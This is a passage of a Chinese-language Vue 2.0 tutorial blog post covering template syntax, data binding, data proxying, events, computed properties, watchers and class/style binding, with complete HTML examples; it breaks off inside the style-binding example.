---
title: vue-1
tags: [vue]
index_img: "https://tse1-mm.cn.bing.net/th/id/OIP-C.0MIISgK80GylzM9OkrtiyAAAAA?pid=ImgDet&rs=1"
categories:
- [vue]
sticky: 2.0
excerpt: Vue是一道光，绿到你发慌⭐。
Vue2.0入门的第一课，包含【模板语法】、【数据绑定】、【数据代理】、【事件处理】、【计算属性】、【监视属性】、【渲染】、【内置指令】、【生命周期】等内容。
---

说明：本文是基于全网最细尚硅谷天禹老师的vue2.0和vue3.0教程，具体资料可以点击下面的链接。

链接：https://pan.baidu.com/s/1x0IjNeJ-V4gcPeEJIQ7unA 
提取码：f5hy

---

# 1. 初识vue

1. 想让Vue工作，就必须创建一个**Vue实例**，且要传入一个配置对象；

2. root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；

3. root容器里的代码被称为【Vue模板】；

4. Vue实例和容器是一一对应的；

5. 真实开发中只有一个Vue实例，并且会配合着组件一起使用；

6. `{{xxx}}`中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；

7. 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；
	注意区分：js表达式 和 js代码(语句)
		1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：
					(1). `a`
					(2). `a+b`
					(3). `demo(1)`
					(4). `x === y ? 'a' : 'b'`
		2.js代码(语句)
					(1). `if(){}`
					(2). `for(){}`
	
	```vue
	<!DOCTYPE html>
	<html>
	<head>
		<meta charset="UTF-8" />
		<title>初识Vue</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	
	<body>
		<!-- 准备好一个vue容器 -->
		<div id="demo">
			<h1>Hello，{{name.toUpperCase()}}，{{address}}</h1>
		</div>
	
		<script type="text/javascript">
			Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
	
			//创建Vue实例
			new Vue({
				el: '#demo', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。
				data: { //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
					name: 'atguigu',
					address: '北京'
				}
			})
	
		</script>
	</body>
	</html>
	```

# 2. vue模板语法

Vue模板语法有2大类 ：
1. 插值语法：
		功能：用于解析标签体内容。
		写法：`{{xxx}}`，xxx是js表达式，且可以直接读取到data中的所有属性。
	
2. 指令语法：
		功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。
		举例：`v-bind:href="xxx"` 或  简写为 `:href="xxx"`，xxx同样要写js表达式，
				 且可以直接读取到data中的所有属性。
		备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。
	
	```vue
	<!DOCTYPE html>
	<html>
		<head>
			<meta charset="UTF-8" />
			<title>模板语法</title>
			<!-- 引入Vue -->
			<script type="text/javascript" src="../js/vue.js"></script>
		</head>
		<body>
			<!-- 准备好一个容器-->
			<div id="root">
				<h1>插值语法</h1>
				<h3>你好，{{name}}</h3>
	
				<hr/>
	
				<h1>指令语法</h1>
				<!-- 完整写法 -->
				<a v-bind:href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a> 
				<!-- 简略写法 -->
				<a :href="school.url" x="hello">点我去{{school.name}}学习2</a> 
			</div>
		</body>
	
		<!-- 阻止 vue 在启动时生成生产提示。 -->
		<script type="text/javascript">
			Vue.config.productionTip = false 
	
			new Vue({
				el:'#root',
				data:{
					name:'jack',
					school:{
						name:'尚硅谷',
						url:'http://www.atguigu.com',
					}
				}
			})
		</script>
	</html>
	```
	

# 3. 数据绑定

Vue中有2种数据绑定的方式：

1. 单向绑定(v-bind)：数据只能从data流向页面。
2. 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
   备注：
   		1.双向绑定一般都应用在表单类元素上（如：input、select等）
   		2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。

**注意**：在下面的代码笔记中显示出了两种写法，但是在浏览器上测试的时候需要注释掉其中一种。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>数据绑定</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<!-- 普通写法 -->
			单向数据绑定：<input type="text" v-bind:value="name"><br/>
			双向数据绑定：<input type="text" v-model:value="name"><br/> 

			<!-- 简写 -->
			单向数据绑定：<input type="text" :value="name"><br/>
			双向数据绑定：<input type="text" v-model="name"><br/>

			<!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 -->
			<!-- <h2 v-model:x="name">你好啊</h2> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```

# 4. el的两种写法

data和el的两种写法：

1. el有2种写法
		(1). new Vue时候配置el属性。
	(2). 先创建Vue实例，随后再通过`vm.$mount('#root')`指定el的值。
2. data有2种写法
		(1).对象式
	(2).函数式
		 如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。
3. **一个重要的原则**：
				由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。

> 1. el的两种写法：
>
>    ```vue
>    const v = new Vue({
>    	el:'#root', // 第一种写法
>    	data:{
>    		name:'尚硅谷'
>    	}
>    })
>    ```
>
>    ```vue
>    // 第二种写法
>    v.$mount('#root')
>    ```
>
> 2. data的两种写法：
>
>    ```vue
>    new Vue({
>    	el:'#root',
>    	//data的第一种写法：对象式
>    	data:{
>    		name:'尚硅谷'
>    	}
>    })
>    ```
>
>    ```vue
>    new Vue({
>    	el:'#root',
>    	//data的第二种写法：函数式
>    	data(){
>    		console.log(this) //此处的this是Vue实例对象
>    		return{
>    			name:'尚硅谷'
>    		}
>    	}
>    })
>    ```

**注意**：在下面的代码笔记中显示出了两种写法，但是在浏览器上测试的时候需要注释掉其中一种。

```vue
<!-- 完整代码 -->
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>el与data的两种写法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h1>你好，{{name}}</h1>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//el的两种写法
		const v = new Vue({
			el:'#root', //第一种写法
			data:{
				name:'尚硅谷'
			}
		})
		console.log(v)
		v.$mount('#root') //第二种写法

		//data的两种写法
		new Vue({
			el:'#root',
			//data的第一种写法：对象式
			data:{
				name:'尚硅谷'
			}

			//data的第二种写法：函数式
			data(){
				console.log('@@@',this) //此处的this是Vue实例对象
				return{
					name:'尚硅谷'
				}
			}
		})
	</script>
</html>
```

# 5. MVVM模型

MVVM模型

1. M：模型(Model) ：data中的数据

2. V：视图(View) ：模板代码

3. VM：视图模型(ViewModel)：Vue实例

观察发现：

1. data中所有的属性，最后都出现在了**vm**身上。
2. vm 身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>理解MVVM</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>

		<div id="root">
			<h1>学校名称：{{name}}</h1>
			<h1>学校地址：{{address}}</h1>
			<h1>测试一下1：{{1+1}}</h1>
			<h1>测试一下2：{{$options}}</h1>
			<h1>测试一下3：{{$emit}}</h1>
			<h1>测试一下4：{{_c}}</h1>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				address:'北京',
			}
		})
		console.log(vm)
	</script>
</html>
```

# 6. 数据代理

## 6.1 回顾Object.defineproperty方法

案例：向person中添加age属性。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>回顾Object.defineproperty方法</title>
	</head>
	<body>
		<script type="text/javascript" >
			let number = 18
			let person = {
				name:'张三',
				sex:'男',
			}

			Object.defineProperty(person,'age',{
				// value:18,
				// enumerable:true, //控制属性是否可以枚举，默认值是false
				// writable:true, //控制属性是否可以被修改，默认值是false
				// configurable:true //控制属性是否可以被删除，默认值是false

				//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
				get(){
					console.log('有人读取age属性了')
					return number
				},

				//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
				set(value){
					console.log('有人修改了age属性，且值是',value)
					number = value
				}

			})
			console.log(person)
		</script>
	</body>
</html>
```

## 6.2 何为数据代理

数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）

## 6.3 vue中的数据代理

1. Vue中的数据代理：
	 		通过vm对象来代理data对象中属性的操作（读/写）
2. Vue中数据代理的好处：
	 		更加方便的操作data中的数据
3. 基本原理：
			通过`Object.defineProperty()`把data对象中所有属性添加到vm上。
			为每一个添加到vm上的属性，都指定一个getter/setter。
			在getter/setter内部去操作（读/写）data中对应的属性。

通过下面的代码理解：

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue中的数据代理</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2>学校名称：{{name}}</h2>
			<h2>学校地址：{{address}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				address:'宏福科技园'
			}
		})
	</script>
</html>
```

![数据代理图示](https://gitee.com/li-il/pic_bed/raw/master/img/20220319113623.png)

# 7. 事件处理

## 7.1 事件的基本使用

事件的基本使用：

1. 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
2. 事件的回调需要配置在methods对象中，最终会在vm上；
3. methods中配置的函数，**不要用箭头函数**！否则this就不是vm了，而是向外找；
4. methods中配置的函数，都是被Vue所管理的函数，this的指向是 vm 或 组件实例对象 ；
5. `@click="demo"` 和 `@click="demo($event)"` 效果一致，但后者可以传参；

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件的基本使用</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<!-- <button v-on:click="showInfo">点我提示信息</button> -->
			<button @click="showInfo1">点我提示信息1（不传参）</button>
			<button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			methods:{
				showInfo1(event){
					// console.log(event) // 这里输出的是Point、erEvent事件对象
					// console.log(event.target.innerText)  // 这里输出的是“点我提示信息1（不传参）”
					// console.log(this) //此处的this是vm
					alert('同学你好！')
				},
				showInfo2(event,number){
					console.log(event,number)
					// console.log(event.target.innerText)
					// console.log(this) //此处的this是vm
					alert('同学你好！！')
				}
			}
		})
	</script>
</html>
```

## 7.2 事件修饰符

**注意**：首先需要有html事件冒泡的基础知识。

vue中的事件修饰符：

1. prevent：阻止默认事件（常用）；
2. stop：阻止事件冒泡（常用）；
3. once：事件只触发一次（常用）；
4. capture：使用事件的捕获模式；
5. self：只有event.target是当前操作的元素时才触发事件；
6. passive：事件的默认行为立即执行，无需等待事件回调执行完毕；

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件修饰符</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
		<style>
			*{
				margin-top: 20px;
			}
			.demo1{
				height: 50px;
				background-color: skyblue;
			}
			.box1{
				padding: 5px;
				background-color: skyblue;
			}
			.box2{
				padding: 5px;
				background-color: orange;
			}
			.list{
				width: 200px;
				height: 200px;
				background-color: peru;
				overflow: auto;
			}
			li{
				height: 100px;
			}
		</style>
	</head>
	<body>
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- 阻止默认事件（常用） -->
			<a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>

			<!-- 阻止事件冒泡（常用） -->
			<div class="demo1" @click="showInfo">
				<button @click.stop="showInfo">点我提示信息</button>
				<!-- 修饰符可以连续写，例如此处要阻止事件冒泡，还要阻止页面跳转的默认事件 -->
				<!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
			</div>

			<!-- 事件只触发一次（常用） -->
			<button @click.once="showInfo">点我提示信息</button>

			<!-- 使用事件的捕获模式 -->
			<div class="box1" @click.capture="showMsg(1)">
				div1
				<div class="box2" @click="showMsg(2)">
					div2
				</div>
			</div>

			<!-- 只有event.target是当前操作的元素时才触发事件； -->
			<div class="demo1" @click.self="showInfo">
				<button @click="showInfo">点我提示信息</button>
			</div>

			<!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
			<ul @wheel.passive="demo" class="list">
				<li>1</li>
				<li>2</li>
				<li>3</li>
				<li>4</li>
			</ul>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods:{
				showInfo(e){
					alert('同学你好！')
					// console.log(e.target)
				},
				showMsg(msg){
					console.log(msg)
				},
				demo(){
					for (let i = 0; i < 100000; i++) {
						console.log('#')
					}
					console.log('累坏了')
				}
			}
		})
	</script>
</html>
```

## 7.3 键盘事件

1. Vue中常用的按键别名：
	 		     回车 => enter
	 		删除 => delete (捕获“删除”和“退格”键)
	 		退出 => esc
	 		空格 => space
	 		换行 => tab (特殊，必须配合keydown去使用)
	 		上 => up
	 		下 => down
	 		左 => left
	 		右 => right
2. Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）
3. 系统修饰键（用法特殊）：ctrl、alt、shift、meta
	 	(1). 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
	(2). 配合keydown使用：正常触发事件。
4. 也可以使用keyCode去指定具体的按键（不推荐），因为在不同的系统下有些按键的keyCode可能不同。
5. Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名

> 将下面的第12行代码改写成：
>
> `<input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo">`
>
> 则会发现在输入框中输入字符后，点击回车键，就会log出所输入的内容。
>
> ---------
>
> 将下面的第12行代码改写成：
>
> `<input type="text" placeholder="按下回车提示输入" @keydown.ctrl="showInfo">`
>
> 则会发现在输入框中输入字符后，点击ctrl，就会log出所输入的内容。
>
> ----------
>
> 将下面的第12行代码改写成：
>
> `<input type="text" placeholder="按下回车提示输入" @keyup.ctrl.y="showInfo">`
>
> 则会发现在输入框中输入字符后，同时点击ctrl和y，就会log出所输入的内容。

```vue
<!-- 代码的最终写法： -->
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>键盘事件</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
			<!-- 注意此处的showInfo并不是方法的写法 -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods: {
				showInfo(e){
					// console.log(e.key,e.keyCode)
					console.log(e.target.value)
				}
			},
		})
	</script>
</html>
```



# 8. 计算属性

## 8.1 姓名案例_插值语法实现

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_插值语法实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{firstName}}-{{lastName}}</span>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三'
			}
		})
	</script>
</html>
```

## 8.2 姓名案例_methods实现

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_methods实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName()}}</span>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三'
			},
			methods: {
				fullName(){
					console.log('@---fullName')
					return this.firstName + '-' + this.lastName
				}
			},
		})
	</script>
</html>
```

data中的数据，只要有任一变化，就会**重新解析模板**。属性会重新检查，插值语法里面的方法也会重新调用。

## 8.3 姓名案例_计算属性实现

计算属性：

1. 定义：要用的属性不存在，要通过已有属性计算得来。
2. 原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
3. get函数什么时候执行？
	 	(1). 初次读取时会执行一次。
	(2). 当依赖的数据发生改变时会被再次调用。
4. 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
5. 备注：
	(1). 计算属性最终会出现在vm上，直接读取使用即可。
	(2). 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的
	数据发生改变。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_计算属性实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			测试：<input type="text" v-model="x"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
				x:'你好'
			},
			computed:{
				fullName:{
					// get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
					get(){
						// console.log('get被调用了') // 可以log查看get什么时候被调用
						// console.log(this) //此处的this是vm
						return this.firstName + '-' + this.lastName
					},
					// set什么时候调用? 当fullName被修改时。
					set(value){
						console.log('set',value)
						const arr = value.split('-')
						this.firstName = arr[0]
						this.lastName = arr[1]
					}
				}
			}
		})
	</script>
</html>
```

## 8.4 姓名案例_计算属性简写

有时候如果只展示属性但是不需要修改属性（只读不写），不需要set，就可以使用简写方式。

> 完整方式：
>
> ```vue
> computed:{
> 	fullName:{
> 		get(){
> 			console.log('get被调用了')
> 			return this.firstName + '-' + this.lastName
> 		},
> 		set(value){
> 			console.log('set',value)
> 			const arr = value.split('-')
> 			this.firstName = arr[0]
> 			this.lastName = arr[1]
> 		}
> 	}
> }
> ```
>
> 简写方式：
>
> ```vue
> computed:{
> 	fullName(){
> 		console.log('get被调用了')
> 		return this.firstName + '-' + this.lastName
> 	}
> }
> ```
>
> 



# 9. 监视属性

vscode插件推荐

![image-20220319142933358](https://gitee.com/li-il/pic_bed/raw/master/img/20220319142933.png)

## 9.1 天气案例

需求：点击下面的按钮实现今天天气是炎热还是凉爽的切换

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
		})
	</script>
</html>
```

> 可以使用一些简单的写法，直接写在@click事件里面，例如：
>
> ```vue
> 绑定事件的时候：可以写一些简单的语句，例如下面的写法：
> <button @click="isHot = !isHot">切换天气</button>
> ```
>
> 注意此处可以直接从isHot里面拿值，所以不用this。
>
> 而完整写法由于需要从vue的实例对象里面拿到isHot，所以需要用到this。

## 9.2 天气案例_监视属性

监视属性watch：

1. 当被监视的属性变化时, 回调函数自动调用, 进行相关操作
2. 监视的属性必须存在，才能进行监视！！
3. 监视的两种写法：
		(1).new Vue时传入watch配置
		(2).通过vm.$watch监视

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_监视属性</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="isHot = !isHot">切换天气</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			watch:{
				// 监视属性的第一种方式
				isHot:{
					immediate:true, //初始化时让handler调用一下
					//handler什么时候调用？当isHot发生改变时。
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				}
			}
		})
		// 监视属性的第二种方式
		vm.$watch('isHot',{
			immediate:true,
			handler(newValue,oldValue){
				console.log('isHot被修改了',newValue,oldValue)
			}
		})
	</script>
</html>
		
```

## 9.3 深度监视

深度监视：
		(1).Vue中的watch默认不监测对象内部值的改变（一层）。
		(2).配置deep:true可以监测对象内部值改变（多层）。
备注：
		(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以。
		(2).使用watch时根据数据的具体结构，决定是否采用深度监视。

> watch可以检测多级结构中某属性的变化，也可以监视所有属性的变化
>
> ```vue
> //监视多级结构中某个属性的变化
> 'numbers.a':{
> 	handler(){
> 		console.log('a被改变了')
> 	}
> }
> //监视多级结构中所有属性的变化
> numbers:{
> 	deep:true,
> 	handler(){
> 		console.log('numbers改变了')
> 	}
> }
> ```
>
> 此处需要注意一个问题：watch中监视的某个属性应该是字符串形式的。



```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_深度监视</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
			<hr/>
			<h3>a的值是:{{numbers.a}}</h3>
			<button @click="numbers.a++">点我让a+1</button>

			<button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
			{{numbers.c.d.e}}
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
				numbers:{
					a:1,
					b:1,
					c:{
						d:{
							e:100
						}
					}
				}
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			watch:{
				isHot:{
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				},
				// 下面两种，共存会报错，需要注释其中一种
				//监视多级结构中某个属性的变化
				'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				}
				//监视多级结构中所有属性的变化
				numbers:{
					deep:true,
					handler(){
						console.log('numbers改变了')
					}
				}
			}
		})

	</script>
</html>
```

## 9.4 天气案例 _ 监视属性 _ 简写

> 1. vm监视的简写
>
>    ```vue
>    watch:{
>    	// 正常写法
>    	isHot:{
>    		// immediate:true, //初始化时让handler调用一下
>    		// deep:true,//深度监视
>    		handler(newValue,oldValue){
>    			console.log('isHot被修改了',newValue,oldValue)
>    		}
>    	},
>    	// 简写 当配置对象里面只有handler时可以简写，但是不能开启深度监视
>    	isHot(newValue,oldValue){
>    		console.log('isHot被修改了',newValue,oldValue,this)
>    	}
>    }
>    ```
>
>    
>
> 2. 第二周
>
>    ```vue
>    // 正常写法
>    vm.$watch('isHot',{
>    	immediate:true, //初始化时让handler调用一下
>    	deep:true,//深度监视
>    	handler(newValue,oldValue){
>    		console.log('isHot被修改了',newValue,oldValue)
>    	}
>    })
>    // 简写
>    vm.$watch('isHot',function(newValue,oldValue){
>    	console.log('isHot被修改了',newValue,oldValue,this)
>    })
>    ```
>
> 注意：
>
> 2.2的方式只能写成标准函数，不能写成箭头函数，否则会造成this指向问题。
>
> 如果是标准函数，this指的是vue；如果是箭头函数，this指的是window。
>
> 所有被vue管理的函数都不能写成箭头函数。

```vue
<!-- 完整代码 -->
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_监视属性_简写</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			watch:{
				//正常写法
				/* isHot:{
					// immediate:true, //初始化时让handler调用一下
					// deep:true,//深度监视
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				}, */
				// 简写 当配置对象里面只有handler时可以简写，但是不能开启深度监视
				/* isHot(newValue,oldValue){
					console.log('isHot被修改了',newValue,oldValue,this)
				} */
			}
		})

		//正常写法
		/* vm.$watch('isHot',{
			immediate:true, //初始化时让handler调用一下
			deep:true,//深度监视
			handler(newValue,oldValue){
				console.log('isHot被修改了',newValue,oldValue)
			}
		}) */

		//简写
		/* vm.$watch('isHot',function(newValue,oldValue){
			console.log('isHot被修改了',newValue,oldValue,this)
		}) */

	</script>
</html>
```

## 9.5 computed和watch之间的区别

computed和watch之间的区别：
1. computed能完成的功能，watch都可以完成。
2. watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。

两个重要的小原则：

1. 所被Vue管理的函数，写成普通函数，这样this的指向才是vm 或 组件实例对象
2. 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调
函数），写成箭头函数，这样this的指向才是vm 或 组件实例对象。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_watch实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
				fullName:'张-三'
			},
			watch:{
				firstName(val){
					setTimeout(()=>{
						console.log(this)
						this.fullName = val + '-' + this.lastName
					},1000);
				},
				lastName(val){
					this.fullName = this.firstName + '-' + val
				}
			}
		})
	</script>
</html>
```



# 10. 绑定样式

1. class样式
			写法:class="xxx" xxx可以是字符串、对象、数组。
					字符串写法适用于：类名不确定，要动态获取。
					对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
					数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
2. style样式
			:style="{fontSize: xxx}"其中xxx是动态值。
			:style="[a,b]"其中a、b是样式对象。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>绑定样式</title>
		<style>
			.basic{
				width: 400px;
				height: 100px;
				border: 1px solid black;
			}
			
			.happy{
				border: 4px solid red;;
				background-color: rgba(255, 255, 0, 0.644);
				background: linear-gradient(30deg,yellow,pink,orange,yellow);
			}
			.sad{
				border: 4px dashed rgb(2, 197, 2);
				background-color: gray;
			}
			.normal{
				background-color: skyblue;
			}

			.atguigu1{
				background-color: yellowgreen;
			}
			.atguigu2{
				font-size: 30px;
				text-shadow:2px 2px 10px red;
			}
			.atguigu3{
				border-radius: 20px;
			}
		</style>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
			<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
			<div class="basic" :class="classArr">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
			<div class="basic" :class="classObj">{{name}}</div> <br/><br/>

			<!-- 绑定style样式--对象写法 -->
			<div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
			<!-- 绑定style样式--对象写法 -->
			<div class="basic" :style="[styleObj,styleObj2]">{{name}}</div> <br/><br/>
			<!-- 绑定style样式--数组写法 -->
			<div class="basic" :style="styleArr">{{name}}</div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				mood:'normal',
				classArr:['atguigu1','atguigu2','atguigu3'],
				classObj:{
